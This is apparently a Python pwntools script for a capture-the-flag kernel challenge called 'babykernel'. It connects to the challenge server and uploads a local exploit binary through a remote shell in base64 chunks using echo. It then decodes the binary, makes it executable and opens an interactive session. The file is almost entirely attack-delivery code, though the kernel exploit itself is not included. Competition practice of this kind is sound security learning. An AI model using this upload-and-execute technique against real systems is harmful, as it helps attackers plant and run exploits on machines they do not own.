#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
file = './exploit'
context.log_level = 'info'
context.newline = b'\r\n'
host, port = 'babykernel.ctf.intigriti.io', 1343

# =========================================================
#                         EXPLOITS
# =========================================================
is_root = False
def run(cmd):
    ch = b'# '
    if not is_root:
        ch = b'$ '
    io.sendlineafter(ch, cmd)
    return io.recvline()

def upload_payload():
    with open(file, 'rb') as f:
        payload = base64.b64encode(f.read()).decode()    
    for i in range(0, len(payload), 512):
        print(f'Uploading... {i:x} / {len(payload):x}')
        run(f'echo "{payload[i:i+512]}" >> /home/ctf/b64exp'.encode())
    run(b'base64 -d /home/ctf/b64exp > /home/ctf/exploit')
    run(b'rm /home/ctf/b64exp')
    run(b'chmod +x /home/ctf/exploit')

def exploit():
    global io
    io = remote(host, port)

    upload_payload()
    context.log_level = 'debug' # somehow output is broken lol

    io.interactive()

if __name__ == '__main__':
    exploit()